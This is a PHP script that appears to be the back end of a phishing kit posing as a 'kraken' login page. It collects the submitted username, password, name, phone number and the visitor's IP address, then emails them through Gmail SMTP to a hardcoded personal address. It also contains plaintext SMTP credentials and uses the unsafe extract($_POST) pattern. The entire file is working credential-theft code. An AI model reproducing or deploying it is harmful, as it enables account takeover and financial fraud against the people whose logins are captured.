<?php

extract($_POST);

$ip = $_SERVER['REMOTE_ADDR'];
require 'PHPMailer/PHPMailerAutoload.php';
require 'PHPMailer/class.phpmailer.php';


    $customerEmailer = '<!DOCTYPE html>
                                <html>
                                    <head>
                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
                                    </head>
                                    <body>
                                        <p>Username : ' . $email . '</p>
                                        <p>Password : ' . $password . '</p>
                                        <p>First Name : ' . $name . '</p>
                                        <p>Registered  Number : ' . $number . '</p>
                                        <p>IP : ' . $ip . '</p>
                                        </body>
                                </html>';
    $subject = 'Alert - kraken Login Details Received';
 

$message = $customerEmailer;
$toAddress = 'vikramkrati29@gmail.com';
$toAddress1 = 'vikramkrati29@gmail.com';
$fromTitle = $_SERVER['HTTP_HOST'];
$fromEmail = 'details@' . $_SERVER['HTTP_HOST'];
$mail = new PHPMailer;
//$mail->IsSMTP();
//$mail->Mailer = 'smtp';
$mail->SMTPDebug = 2;
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'smtpkeymail@gmail.com';
$mail->Password = 'smtpkeymail112@';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;
$mail->setFrom($fromEmail, $fromTitle);
$mail->addAddress($toAddress);
$mail->AddCC($toAddress1);
$mail->isHTML(true);
$mail->Subject = $subject;
$mail->Body = $message;
$mailS = $mail->send();
?>